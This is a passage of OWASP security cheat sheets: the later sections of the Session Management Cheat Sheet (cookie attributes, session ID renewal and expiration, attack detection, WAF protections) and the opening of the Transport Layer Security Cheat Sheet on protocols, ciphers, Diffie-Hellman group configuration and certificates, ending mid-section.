- Where possible, avoid offering public unencrypted contents and private encrypted contents from the same host. Where insecure content is required, consider hosting this on a separate insecure domain.
- Implement [HTTP Strict Transport Security (HSTS)](HTTP_Strict_Transport_Security_Cheat_Sheet.md) to enforce HTTPS connections.

See the OWASP [Transport Layer Security Cheat Sheet](Transport_Layer_Security_Cheat_Sheet.md) for more general guidance on implementing TLS securely.

It is important to emphasize that TLS does not protect against session ID prediction, brute force, client-side tampering or fixation; however, it does provide effective protection against an attacker intercepting or stealing session IDs through a man in the middle attack.

## Cookies

The session ID exchange mechanism based on cookies provides multiple security features in the form of cookie attributes that can be used to protect the exchange of the session ID:

### Secure Attribute

The `Secure` cookie attribute instructs web browsers to only send the cookie through an encrypted HTTPS (SSL/TLS) connection. This session protection mechanism is mandatory to prevent the disclosure of the session ID through MitM (Man-in-the-Middle) attacks. It ensures that an attacker cannot simply capture the session ID from web browser traffic.

Forcing the web application to only use HTTPS for its communication (even when port TCP/80, HTTP, is closed in the web application host) does not protect against session ID disclosure if the `Secure` cookie has not been set - the web browser can be deceived to disclose the session ID over an unencrypted HTTP connection. The attacker can intercept and manipulate the victim user traffic and inject an HTTP unencrypted reference to the web application that will force the web browser to submit the session ID in the clear.

See also: [SecureFlag](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies)

### HttpOnly Attribute

The `HttpOnly` cookie attribute instructs web browsers not to allow scripts (e.g. JavaScript or VBscript) an ability to access the cookies via the DOM document.cookie object. This session ID protection is mandatory to prevent session ID stealing through XSS attacks. However, if an XSS attack is combined with a CSRF attack, the requests sent to the web application will include the session cookie, as the browser always includes the cookies when sending requests. The `HttpOnly` cookie only protects the confidentiality of the cookie; the attacker cannot use it offline, outside of the context of an XSS attack.

See the OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md).

See also: [HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies)

### SameSite Attribute

SameSite defines a cookie attribute preventing browsers from sending a SameSite flagged cookie with cross-site requests. The main goal is to mitigate the risk of cross-origin information leakage, and provides some protection against cross-site request forgery attacks.

See also: [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies)

### Domain and Path Attributes

The [`Domain` cookie attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Directives) instructs web browsers to only send the cookie to the specified domain and all subdomains. If the attribute is not set, by default the cookie will only be sent to the origin server. The [`Path` cookie attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Directives) instructs web browsers to only send the cookie to the specified directory or subdirectories (or paths or resources) within the web application. If the attribute is not set, by default the cookie will only be sent for the directory (or path) of the resource requested and setting the cookie.

It is recommended to use a narrow or restricted scope for these two attributes. In this way, the `Domain` attribute should not be set (restricting the cookie just to the origin server) and the `Path` attribute should be set as restrictive as possible to the web application path that makes use of the session ID.

Setting the `Domain` attribute to a too permissive value, such as `example.com` allows an attacker to launch attacks on the session IDs between different hosts and web applications belonging to the same domain, known as cross-subdomain cookies. For example, vulnerabilities in `www.example.com` might allow an attacker to get access to the session IDs from `secure.example.com`.

Additionally, it is recommended not to mix web applications of different security levels on the same domain. Vulnerabilities in one of the web applications would allow an attacker to set the session ID for a different web application on the same domain by using a permissive `Domain` attribute (such as `example.com`) which is a technique that can be used in [session fixation attacks](https://www.acrossecurity.com/papers/session_fixation.pdf).

Although the `Path` attribute allows the isolation of session IDs between different web applications using different paths on the same host, it is highly recommended not to run different web applications (especially from different security levels or scopes) on the same host. Other methods can be used by these applications to access the session IDs, such as the `document.cookie` object. Also, any web application can set cookies for any path on that host.

Cookies are vulnerable to DNS spoofing/hijacking/poisoning attacks, where an attacker can manipulate the DNS resolution to force the web browser to disclose the session ID for a given host or domain.

### Expire and Max-Age Attributes

Session management mechanisms based on cookies can make use of two types of cookies, non-persistent (or session) cookies, and persistent cookies. If a cookie presents the [`Max-Age`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Directives) (that has preference over `Expires`) or [`Expires`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Directives) attributes, it will be considered a persistent cookie and will be stored on disk by the web browser based until the expiration time.

Typically, session management capabilities to track users after authentication make use of non-persistent cookies. This forces the session to disappear from the client if the current web browser instance is closed. Therefore, it is highly recommended to use non-persistent cookies for session management purposes, so that the session ID does not remain on the web client cache for long periods of time, from where an attacker can obtain it.

- Ensure that sensitive information is not compromised by ensuring that it is not persistent, encrypting it, and storing it only for the duration of the need
- Ensure that unauthorized activities cannot take place via cookie manipulation
- Ensure secure flag is set to prevent accidental transmission over the wire in a non-secure manner
- Determine if all state transitions in the application code properly check for the cookies and enforce their use
- Ensure entire cookie should be encrypted if sensitive data is persisted in the cookie
- Define all cookies being used by the application, their name and why they are needed

## HTML5 Web Storage API

The Web Hypertext Application Technology Working Group (WHATWG) describes the HTML5 Web Storage APIs, `localStorage` and `sessionStorage`, as mechanisms for storing name-value pairs client-side.
Unlike HTTP cookies, the contents of `localStorage` and `sessionStorage` are not automatically shared within requests or responses by the browser and are used for storing data client-side.

### The localStorage API

#### Scope

Data stored using the `localStorage` API is accessible by pages which are loaded from the same origin, which is defined as the scheme (`https://`), host (`example.com`), port (`443`) and domain/realm (`example.com`).
This provides similar access to this data as would be achieved by using the `secure` flag on a cookie, meaning that data stored from `https` could not be retrieved via `http`. Due to potential concurrent access from separate windows/threads, data stored using `localStorage` may be susceptible to shared access issues (such as race-conditions) and should be considered non-locking ([Web Storage API Spec](https://html.spec.whatwg.org/multipage/webstorage.html#the-localstorage-attribute)).

#### Duration

Data stored using the `localStorage` API is persisted across browsing sessions, extending the timeframe in which it may be accessible to other system users.

#### Offline Access

The standards do not require `localStorage` data to be encrypted-at-rest, meaning it may be possible to directly access this data from disk.

#### Use Case

WHATWG suggests the use of `localStorage` for data that needs to be accessed across windows or tabs, across multiple sessions, and where large (multi-megabyte) volumes of data may need to be stored for performance reasons.

### The sessionStorage API

#### Scope

The `sessionStorage` API stores data within the window context from which it was called, meaning that Tab 1 cannot access data which was stored from Tab 2.
Also, like the `localStorage` API, data stored using the `sessionStorage` API is accessible by pages which are loaded from the same origin, which is defined as the scheme (`https://`), host (`example.com`), port (`443`) and domain/realm (`example.com`).
This provides similar access to this data as would be achieved by using the `secure` flag on a cookie, meaning that data stored from `https` could not be retrieved via `http`.

#### Duration

The `sessionStorage` API only stores data for the duration of the current browsing session. Once the tab is closed, that data is no longer retrievable. This does not necessarily prevent access, should a browser tab be reused or left open. Data may also persist in memory until a garbage collection event.

#### Offline Access

The standards do not require `sessionStorage` data to be encrypted-at-rest, meaning it may be possible to directly access this data from disk.

#### Use Case

WHATWG suggests the use of `sessionStorage` for data that is relevant for one-instance of a workflow, such as details for a ticket booking, but where multiple workflows could be performed in other tabs concurrently. The window/tab bound nature will keep the data from leaking between workflows in separate tabs.

### References

- [Web Storage APIs](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API)
- [LocalStorage API](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)
- [SessionStorage API](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)
- [WHATWG Web Storage Spec](https://html.spec.whatwg.org/multipage/webstorage.html#webstorage)

## Web Workers

Web Workers run JavaScript code in a global context separate from the one of the current window. A communication channel with the main execution window exists, which is called `MessageChannel`.

### Use Case

Web Workers are an alternative for browser storage of (session) secrets when storage persistence across page refresh is not a requirement. For Web Workers to provide secure browser storage, any code that requires the secret should exist within the Web Worker and the secret should never be transmitted to the main window context.

Storing secrets within the memory of a Web Worker offers the same security guarantees as an HttpOnly cookie: the confidentiality of the secret is protected. Still, an XSS attack can be used to send messages to the Web Worker to perform an operation that requires the secret. The Web Worker will return the result of the operation to the main execution thread.

The advantage of a Web Worker implementation compared to an HttpOnly cookie is that a Web Worker allows for some isolated JavaScript code to access the secret; an HttpOnly cookie is not accessible to any JavaScript. If the frontend JavaScript code requires access to the secret, the Web Worker implementation is the only browser storage option that preserves the secret confidentiality.

## Session ID Life Cycle

### Session ID Generation and Verification: Permissive and Strict Session Management

There are two types of session management mechanisms for web applications, permissive and strict, related to session fixation vulnerabilities. The permissive mechanism allows the web application to initially accept any session ID value set by the user as valid, creating a new session for it, while the strict mechanism enforces that the web application will only accept session ID values that have been previously generated by the web application.

The session tokens should be handled by the web server if possible or generated via a cryptographically secure random number generator.

Although the most common mechanism in use today is the strict one (more secure), [PHP defaults to permissive](https://wiki.php.net/rfc/session-use-strict-mode). Developers must ensure that the web application does not use a permissive mechanism under certain circumstances. Web applications should never accept a session ID they have never generated, and in case of receiving one, they should generate and offer the user a new valid session ID. Additionally, this scenario should be detected as a suspicious activity and an alert should be generated.

### Manage Session ID as Any Other User Input

Session IDs must be considered untrusted, as any other user input processed by the web application, and they must be thoroughly validated and verified. Depending on the session management mechanism used, the session ID will be received in a GET or POST parameter, in the URL or in an HTTP header (e.g. cookies). If web applications do not validate and filter out invalid session ID values before processing them, they can potentially be used to exploit other web vulnerabilities, such as SQL injection if the session IDs are stored on a relational database, or persistent XSS if the session IDs are stored and reflected back afterwards by the web application.

### Renew the Session ID After Any Privilege Level Change

The session ID must be renewed or regenerated by the web application after any privilege level change within the associated user session. The most common scenario where the session ID regeneration is mandatory is during the authentication process, as the privilege level of the user changes from the unauthenticated (or anonymous) state to the authenticated state though in some cases still not yet the authorized state. Common scenarios to consider include; password changes, permission changes, or switching from a regular user role to an administrator role within the web application. For all sensitive pages of the web application, any previous session IDs must be ignored, only the current session ID must be assigned to every new request received for the protected resource, and the old or previous session ID must be destroyed.

The most common web development frameworks provide session functions and methods to renew the session ID, such as `request.getSession(true)` & `HttpSession.invalidate()` (J2EE), `Session.Abandon()` & `Response.Cookies.Add(new...)` (ASP .NET), or `session_start()` & `session_regenerate_id(true)` (PHP).

The session ID regeneration is mandatory to prevent [session fixation attacks](https://www.acrossecurity.com/papers/session_fixation.pdf), where an attacker sets the session ID on the victim user's web browser instead of gathering the victim's session ID, as in most of the other session-based attacks, and independently of using HTTP or HTTPS. This protection mitigates the impact of other web-based vulnerabilities that can also be used to launch session fixation attacks, such as HTTP response splitting or XSS (see [here](https://media.blackhat.com/bh-eu-11/Raul_Siles/BlackHat_EU_2011_Siles_SAP_Session-Slides.pdf) and [here](https://media.blackhat.com/bh-eu-11/Raul_Siles/BlackHat_EU_2011_Siles_SAP_Session-WP.pdf)).

A complementary recommendation is to use a different session ID or token name (or set of session IDs) pre and post authentication, so that the web application can keep track of anonymous users and authenticated users without the risk of exposing or binding the user session between both states.

### Reauthentication After Risk Events

Web applications should require reauthentication after high-risk events such as:

- Changes to critical user information (e.g., password, email address)
- Login attempts from new or suspicious IP addresses or devices
- Account recovery flows (e.g., password reset or compromised-account detection)

For best practices on implementing reauthentication after these events, see the [Reauthentication After Risk Events](Authentication_Cheat_Sheet.md#reauthentication-after-risk-events) section in the Authentication Cheat Sheet

### Additional Resources

- [Why Frequent Reauthentication Can Be a UX Pitfall](https://tailscale.com/blog/frequent-reauth-security?lid=5wso20mx4knj) by Tailscale

### Considerations When Using Multiple Cookies

If the web application uses cookies as the session ID exchange mechanism, and multiple cookies are set for a given session, the web application must verify all cookies (and enforce relationships between them) before allowing access to the user session.

It is very common for web applications to set a user cookie pre-authentication over HTTP to keep track of unauthenticated (or anonymous) users. Once the user authenticates in the web application, a new post-authentication secure cookie is set over HTTPS, and a binding between both cookies and the user session is established. If the web application does not verify both cookies for authenticated sessions, an attacker can make use of the pre-authentication unprotected cookie to get access to the authenticated user session (see [here](https://media.blackhat.com/bh-eu-11/Raul_Siles/BlackHat_EU_2011_Siles_SAP_Session-Slides.pdf) and [here](https://media.blackhat.com/bh-eu-11/Raul_Siles/BlackHat_EU_2011_Siles_SAP_Session-WP.pdf)).

Web applications should try to avoid the same cookie name for different paths or domain scopes within the same web application, as this increases the complexity of the solution and potentially introduces scoping issues.

## Session Expiration

In order to minimize the time period an attacker can launch attacks over active sessions and hijack them, it is mandatory to set expiration timeouts for every session, establishing the amount of time a session will remain active. Insufficient session expiration by the web application increases the exposure of other session-based attacks, as for the attacker to be able to reuse a valid session ID and hijack the associated session, it must still be active.

The shorter the session interval is, the lesser the time an attacker has to use the valid session ID. The session expiration timeout values must be set accordingly with the purpose and nature of the web application, and balance security and usability, so that the user can comfortably complete the operations within the web application without the session frequently expiring.

Both the idle and absolute timeout values are highly dependent on how critical the web application and its data are. Common idle timeouts ranges are 2-5 minutes for high-value applications and 15-30 minutes for low risk applications. Absolute timeouts depend on how long a user usually uses the application. If the application is intended to be used by an office worker for a full day, an appropriate absolute timeout range could be between 4 and 8 hours.

When a session expires, the web application must take active actions to invalidate the session on both sides, client and server. The latter is the most relevant and mandatory from a security perspective.

For most session exchange mechanisms, client side actions to invalidate the session ID are based on clearing out the token value. For example, to invalidate a cookie it is recommended to provide an empty (or invalid) value for the session ID, and set the `Expires` (or `Max-Age`) attribute to a date from the past (in case a persistent cookie is being used): `Set-Cookie: id=; Expires=Friday, 17-May-03 18:45:00 GMT`

In order to close and invalidate the session on the server side, it is mandatory for the web application to take active actions when the session expires, or the user actively logs out, by using the functions and methods offered by the session management mechanisms, such as `HttpSession.invalidate()` (J2EE), `Session.Abandon()` (ASP .NET) or `session_destroy()/unset()` (PHP).

### Automatic Session Expiration

#### Idle Timeout

All sessions should implement an idle or inactivity timeout. This timeout defines the amount of time a session will remain active in case there is no activity in the session, closing and invalidating the session upon the defined idle period since the last HTTP request received by the web application for a given session ID.

The idle timeout limits the chances an attacker has to guess and use a valid session ID from another user. However, if the attacker is able to hijack a given session, the idle timeout does not limit the attacker's actions, as they can generate activity on the session periodically to keep the session active for longer periods of time.

Session timeout management and expiration must be enforced server-side. If the client is used to enforce the session timeout, for example using the session token or other client parameters to track time references (e.g. number of minutes since login time), an attacker could manipulate these to extend the session duration.

#### Absolute Timeout

All sessions should implement an absolute timeout, regardless of session activity. This timeout defines the maximum amount of time a session can be active, closing and invalidating the session upon the defined absolute period since the given session was initially created by the web application. After invalidating the session, the user is forced to (re)authenticate again in the web application and establish a new session.

The absolute session limits the amount of time an attacker can use a hijacked session and impersonate the victim user.

#### Renewal Timeout

Alternatively, the web application can implement an additional renewal timeout after which the session ID is automatically renewed, in the middle of the user session, and independently of the session activity and, therefore, of the idle timeout.

After a specific amount of time since the session was initially created, the web application can regenerate a new ID for the user session and try to set it, or renew it, on the client. The previous session ID value would still be valid for some time, accommodating a safety interval, before the client is aware of the new ID and starts using it. At that time, when the client switches to the new ID inside the current session, the application invalidates the previous ID.

This scenario minimizes the amount of time a given session ID value, potentially obtained by an attacker, can be reused to hijack the user session, even when the victim user session is still active. The user session remains alive and open on the legitimate client, although its associated session ID value is transparently renewed periodically during the session duration, every time the renewal timeout expires. Therefore, the renewal timeout complements the idle and absolute timeouts, specially when the absolute timeout value extends significantly over time (e.g. it is an application requirement to keep the user sessions open for long periods of time).

Depending on the implementation, potentially there could be a race condition where the attacker with a still valid previous session ID sends a request before the victim user, right after the renewal timeout has just expired, and obtains first the value for the renewed session ID. At least in this scenario, the victim user might be aware of the attack as the session will be suddenly terminated because the associated session ID is not valid anymore.

### Manual Session Expiration

Web applications should provide mechanisms that allow security aware users to actively close their session once they have finished using the web application.

#### Logout Button

Web applications must provide a visible and easily accessible logout (logoff, exit, or close session) button that is available on the web application header or menu and reachable from every web application resource and page, so that the user can manually close the session at any time. As described in *Session_Expiration* section, the web application must invalidate the session at least on server side.

**NOTE**: Unfortunately, not all web applications facilitate users to close their current session. Thus, client-side enhancements allow conscientious users to protect their sessions by helping to close them diligently.

### Web Content Caching

Even after the session has ended, private or sensitive data exchanged during the session may still be accessible through the web browser's cache. To mitigate this, web applications must use restrictive cache directives for all HTTP and HTTPS traffic. This includes the use of HTTP headers such as [`Cache-Control`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control) and [`Pragma`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Pragma), or equivalent `<meta>` tags on all pages—especially those displaying sensitive content.

Session identifiers must never be cached. To prevent this, it is highly recommended to include the `Cache-Control: no-store` directive in responses containing session IDs. Unlike `no-cache`, which allows caching but requires revalidation, `no-store` ensures that the response (including headers like `Set-Cookie`) is never stored in any cache.

> **Note:** The directive `Cache-Control: no-cache="Set-Cookie, Set-Cookie2"` is sometimes suggested to prevent session ID caching. However, this syntax is not widely supported and may lead to unintended behavior. Instead, use `Cache-Control: no-store` for stronger protection.
> **Reference:** [MDN - Cache-Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control)

## Reauthentication After Risk Events

To ensure session integrity and account protection, applications should require reauthentication when specific high-risk events are detected. These may include:

- Attempted or completed password changes
- Login from a new or suspicious IP address or device
- Completion of account recovery or challenge flows (e.g., hacked-lock scenarios)

Requiring reauthentication helps mitigate session hijacking and unauthorized access—especially when long-lived sessions or external identity providers are in use.

**Recommended Practices:**

- Prompt users for primary credentials (e.g., password) or enforce MFA
- Provide clear messaging explaining the need to reauthenticate

## Additional Client-Side Defenses for Session Management

Web applications can complement the previously described session management defenses with additional countermeasures on the client side. Client-side protections, typically in the form of JavaScript checks and verifications, are not bullet proof and can easily be defeated by a skilled attacker, but can introduce another layer of defense that has to be bypassed by intruders.

### Initial Login Timeout

Web applications can use JavaScript code in the login page to evaluate and measure the amount of time since the page was loaded and a session ID was granted. If a login attempt is tried after a specific amount of time, the client code can notify the user that the maximum amount of time to log in has passed and reload the login page, hence retrieving a new session ID.

This extra protection mechanism tries to force the renewal of the session ID pre-authentication, avoiding scenarios where a previously used (or manually set) session ID is reused by the next victim using the same computer, for example, in session fixation attacks.

### Force Session Logout On Web Browser Window Close Events

Web applications can use JavaScript code to capture all the web browser tab or window close (or even back) events and take the appropriate actions to close the current session before closing the web browser, emulating that the user has manually closed the session via the logout button.

### Disable Web Browser Cross-Tab Sessions

Web applications can use JavaScript code once the user has logged in and a session has been established to force the user to re-authenticate if a new web browser tab or window is opened against the same web application. The web application does not want to allow multiple web browser tabs or windows to share the same session. Therefore, the application tries to force the web browser to not share the same session ID simultaneously between them.

**NOTE**: This mechanism cannot be implemented if the session ID is exchanged through cookies, as cookies are shared by all web browser tabs/windows.

### Automatic Client Logout

JavaScript code can be used by the web application in all (or critical) pages to automatically logout client sessions after the idle timeout expires, for example, by redirecting the user to the logout page (the same resource used by the logout button mentioned previously).

The benefit of enhancing the server-side idle timeout functionality with client-side code is that the user can see that the session has finished due to inactivity, or even can be notified in advance that the session is about to expire through a count down timer and warning messages. This user-friendly approach helps to avoid loss of work in web pages that require extensive input data due to server-side silently expired sessions.

## Session Attacks Detection

### Session ID Guessing and Brute Force Detection

If an attacker tries to guess or brute force a valid session ID, they need to launch multiple sequential requests against the target web application using different session IDs from a single (or set of) IP address(es). Additionally, if an attacker tries to analyze the predictability of the session ID (e.g. using statistical analysis), they need to launch multiple sequential requests from a single (or set of) IP address(es) against the target web application to gather new valid session IDs.

Web applications must be able to detect both scenarios based on the number of attempts to gather (or use) different session IDs and alert and/or block the offending IP address(es).

### Detecting Session ID Anomalies

Web applications should focus on detecting anomalies associated to the session ID, such as its manipulation. The OWASP [AppSensor Project](https://owasp.org/www-project-appsensor/) provides a framework and methodology to implement built-in intrusion detection capabilities within web applications focused on the detection of anomalies and unexpected behaviors, in the form of detection points and response actions. Instead of using external protection layers, sometimes the business logic details and advanced intelligence are only available from inside the web application, where it is possible to establish multiple session related detection points, such as when an existing cookie is modified or deleted, a new cookie is added, the session ID from another user is reused, or when the user location or User-Agent changes in the middle of a session.

### Binding the Session ID to Other User Properties

With the goal of detecting (and, in some scenarios, protecting against) user misbehaviors and session hijacking, it is highly recommended to bind the session ID to other user or client properties, such as the client IP address, User-Agent, or client-based digital certificate. If the web application detects any change or anomaly between these different properties in the middle of an established session, this is a very good indicator of session manipulation and hijacking attempts, and this simple fact can be used to alert and/or terminate the suspicious session.

Although these properties cannot be used by web applications to trustingly defend against session attacks, they significantly increase the web application detection (and protection) capabilities. However, a skilled attacker can bypass these controls by reusing the same IP address assigned to the victim user by sharing the same network (very common in NAT environments, like Wi-Fi hotspots) or by using the same outbound web proxy (very common in corporate environments), or by manually modifying the User-Agent to look exactly like the victim user's.

### Logging Sessions Life Cycle: Monitoring Creation, Usage, and Destruction of Session IDs

Web applications should increase their logging capabilities by including information regarding the full life cycle of sessions. In particular, it is recommended to record session related events, such as the creation, renewal, and destruction of session IDs, as well as details about its usage within login and logout operations, privilege level changes within the session, timeout expiration, invalid session activities (when detected), and critical business operations during the session.

The log details might include a timestamp, source IP address, web target resource requested (and involved in a session operation), HTTP headers (including the User-Agent and Referer), GET and POST parameters, error codes and messages, username (or user ID), plus the session ID (cookies, URL, GET, POST…).

Sensitive data like the session ID should not be included in the logs in order to protect the session logs against session ID local or remote disclosure or unauthorized access. However, some kind of session-specific information must be logged in order to correlate log entries to specific sessions. It is recommended to log a salted-hash of the session ID instead of the session ID itself in order to allow for session-specific log correlation without exposing the session ID.

In particular, web applications must thoroughly protect administrative interfaces that allow to manage all the current active sessions. Frequently these are used by support personnel to solve session related issues, or even general issues, by impersonating the user and looking at the web application as the user does.

The session logs become one of the main web application intrusion detection data sources, and can also be used by intrusion protection systems to automatically terminate sessions and/or disable user accounts when (one or many) attacks are detected. If active protections are implemented, these defensive actions must be logged too.

### Simultaneous Session Logons

It is the web application design decision to determine if multiple simultaneous logons from the same user are allowed from the same or from different client IP addresses. If the web application does not want to allow simultaneous session logons, it must take effective actions after each new authentication event, implicitly terminating the previously available session, or asking the user (through the old, new or both sessions) about the session that must remain active.

It is recommended for web applications to add user capabilities that allow checking the details of active sessions at any time, monitor and alert the user about concurrent logons, provide user features to remotely terminate sessions manually, and track account activity history (logbook) by recording multiple client details such as IP address, User-Agent, login date and time, idle time, etc.

## Session Management WAF Protections

There are situations where the web application source code is not available or cannot be modified, or when the changes required to implement the multiple security recommendations and best practices detailed above imply a full redesign of the web application architecture, and therefore, cannot be easily implemented in the short term.

In these scenarios, or to complement the web application defenses, and with the goal of keeping the web application as secure as possible, it is recommended to use external protections such as Web Application Firewalls (WAFs) that can mitigate the session management threats already described.

Web Application Firewalls offer detection and protection capabilities against session based attacks. On the one hand, it is trivial for WAFs to enforce the usage of security attributes on cookies, such as the `Secure` and `HttpOnly` flags, applying basic rewriting rules on the `Set-Cookie` header for all the web application responses that set a new cookie.

On the other hand, more advanced capabilities can be implemented to allow the WAF to keep track of sessions, and the corresponding session IDs, and apply all kind of protections against session fixation (by renewing the session ID on the client-side when privilege changes are detected), enforcing sticky sessions (by verifying the relationship between the session ID and other client properties, like the IP address or User-Agent), or managing session expiration (by forcing both the client and the web application to finalize the session).

The open-source ModSecurity WAF, plus the OWASP [Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/), provide capabilities to detect and apply security cookie attributes, countermeasures against session fixation attacks, and session tracking features to enforce sticky sessions.


---
# Transport_Layer_Security_Cheat_Sheet.md

# Transport Layer Security Cheat Sheet

## Introduction

This cheat sheet provides guidance on implementing transport layer protection for applications using Transport Layer Security (TLS). It primarily focuses on how to use TLS to protect clients connecting to a web application over HTTPS, though much of this guidance is also applicable to other uses of TLS. When correctly implemented, TLS can provide several security benefits:

- **Confidentiality**: Provides protection against attackers reading the contents of the traffic.
- **Integrity**: Provides protection against traffic modification, such as an attacker replaying requests against the server.
- **[Authentication](Authentication_Cheat_Sheet.md)**: Enables the client to confirm they are connected to the legitimate server. Note that the identity of the client is not verified unless [client certificates](#client-certificates-and-mutual-tls) are employed.

### SSL vs TLS

Secure Socket Layer (SSL) was the original protocol that was used to provide encryption for HTTP traffic, in the form of HTTPS. There were two publicly released versions of SSL - versions 2 and 3. Both of these have serious cryptographic weaknesses and should no longer be used.

For [various reasons](https://tim.dierks.org/2014/05/security-standards-and-name-changes-in.html) the next version of the protocol (effectively SSL 3.1) was named Transport Layer Security (TLS) version 1.0. Subsequently TLS versions 1.1, 1.2 and 1.3 have been released.

The terms "SSL", "SSL/TLS" and "TLS" are frequently used interchangeably, and in many cases "SSL" is used when referring to the more modern TLS protocol. This cheat sheet will use the term "TLS" except where referring to the legacy protocols.

## Server Configuration

### Only Support Strong Protocols

General purpose web applications should default to **TLS 1.3** (support TLS 1.2 if necessary) with all other protocols disabled.

 In specific and uncommon situations where a web server is required to accommodate legacy clients that depend on outdated and unsecured browsers (like Internet Explorer 10), activating TLS 1.0 may be the only option. However, this approach should be exercised with caution and is generally not advised due to the security implications. Additionally, ["TLS_FALLBACK_SCSV" extension](https://tools.ietf.org/html/rfc7507) should be enabled in order to prevent downgrade attacks against newer clients.

Note that PCI DSS [forbids the use of legacy protocols such as TLS 1.0](https://www.pcisecuritystandards.org/documents/Migrating-from-SSL-Early-TLS-Info-Supp-v1_1.pdf).

### Only Support Strong Ciphers

There are a large number of different ciphers (or cipher suites) that are supported by TLS, that provide varying levels of security. Where possible, only GCM ciphers should be enabled. However, if it is necessary to support legacy clients, then other ciphers may be required. At a minimum, the following types of ciphers should always be disabled:

- Null ciphers
- Anonymous ciphers
- EXPORT ciphers

The Mozilla Foundation provides an [easy-to-use secure configuration generator](https://ssl-config.mozilla.org/) for web, database and mail servers. This tool allows site administrators to select the software they are using and receive a configuration file that is optimized to balance security and compatibility for a wide variety of browser versions and server software.

### Set the appropriate Diffie-Hellman groups

The practice of earlier than TLS 1.3 protocol versions of Diffie-Hellman parameter generation for use by the ephemeral Diffie-Hellman key exchange (signified by the "DHE" or "EDH" strings in the cipher suite name) had practical issues. For example, the client had no say in the selection of server parameters, meaning it could only unconditionally accept or drop, and the random parameter generation often resulted to denial of service attacks (CVE-2022-40735, CVE-2002-20001).

TLS 1.3 restricts Diffie-Hellman group parameters to known groups via the `supported_groups` extension. The available
Diffie-Hellman groups are `ffdhe2048`, `ffdhe3072`, `ffdhe4096`, `ffdhe6144`, `ffdhe8192` as specified in [RFC7919](https://www.rfc-editor.org/rfc/rfc7919).

By default openssl 3.0 enables all the above groups. To modify them ensure that the right Diffie-Hellman group parameters are present in `openssl.cnf`. For example

```text
openssl_conf = openssl_init
[openssl_init]
ssl_conf = ssl_module
[ssl_module]
system_default = tls_system_default
[tls_system_default]
Groups = x25519:prime256v1:x448:ffdhe2048:ffdhe3072
```

An apache configuration would look like

```text
SSLOpenSSLConfCmd Groups x25519:secp256r1:ffdhe3072
```

The same group on NGINX would look like the following

```text
ssl_ecdh_curve x25519:secp256r1:ffdhe3072;
```

For TLS 1.2 or earlier versions it is recommended not to set Diffie-Hellman parameters.

### Disable Compression

TLS compression should be disabled in order to protect against a vulnerability (nicknamed [CRIME](https://threatpost.com/crime-attack-uses-compression-ratio-tls-requests-side-channel-hijack-secure-sessions-091312/77006/)) which could potentially allow sensitive information such as session cookies to be recovered by an attacker.

### Patch Cryptographic Libraries

As well as the vulnerabilities in the SSL and TLS protocols, there have also been a large number of historic vulnerability in SSL and TLS libraries, with [Heartbleed](https://heartbleed.com) being the most well known. As such, it is important to ensure that these libraries are kept up to date with the latest security patches.

### Test the Server Configuration

Once the server has been hardened, the configuration should be tested. The [OWASP Testing Guide chapter on SSL/TLS Testing](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) contains further information on testing.

There are a number of online tools that can be used to quickly validate the configuration of a server, including:

- [SSL Labs Server Test](https://www.ssllabs.com/ssltest)
- [CryptCheck](https://cryptcheck.fr/)
- [Hardenize](https://www.hardenize.com/)
- [ImmuniWeb](https://www.immuniweb.com/ssl/)
- [Observatory by Mozilla](https://observatory.mozilla.org)
- [Scanigma](https://scanigma.com)
- [Stellastra](https://stellastra.com/tls-cipher-suite-check)
- [OWASP PurpleTeam](https://purpleteam-labs.com/) `cloud`

Additionally, there are a number of offline tools that can be used:

- [O-Saft - OWASP SSL advanced forensic tool](https://wiki.owasp.org/index.php/O-Saft)
- [CipherScan](https://github.com/mozilla/cipherscan)
- [CryptoLyzer](https://gitlab.com/coroner/cryptolyzer)
- [SSLScan - Fast SSL Scanner](https://github.com/rbsec/sslscan)
- [SSLyze](https://github.com/nabla-c0d3/sslyze)
- [testssl.sh - Testing any TLS/SSL encryption](https://testssl.sh)
- [tls-scan](https://github.com/prbinu/tls-scan)
- [OWASP PurpleTeam](https://purpleteam-labs.com/) `local`

## Certificates

### Use Strong Keys and Protect Them

The private key used to generate the cipher key must be sufficiently strong for the anticipated lifetime of the private key and corresponding certificate. The current best practice is to select a key size of at least 2048 bits. Additional information on key lifetimes and comparable key strengths can be found [here](http://www.keylength.com/en/compare/) and in [NIST SP 800-57](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf).

The private key should also be protected from unauthorized access using filesystem permissions and other technical and administrative controls.

### Use Strong Cryptographic Hashing Algorithms

Certificates should use SHA-256 for the hashing algorithm, rather than the older MD5 and SHA-1 algorithms. These have a number of cryptographic weaknesses, and are not trusted by modern browsers.

### Use Correct Domain Names

The domain name (or subject) of the certificate must match the fully qualified name of the server that presents the certificate. Historically this was stored in the `commonName` (CN) attribute of the certificate. However, modern versions of Chrome ignore the CN attribute, and require that the FQDN is in the `subjectAlternativeName` (SAN) attribute. For compatibility reasons, certificates should have the primary FQDN in the CN, and the full list of FQDNs in the SAN.

Additionally, when creating the certificate, the following should be taken into account:

- Consider whether the "www" subdomain should also be included.
- Do not include non-qualified hostnames.
- Do not include IP addresses.
- Do not include internal domain names on externally facing certificates.
    - If a server is accessible using both internal and external FQDNs, configure it with multiple certificates.

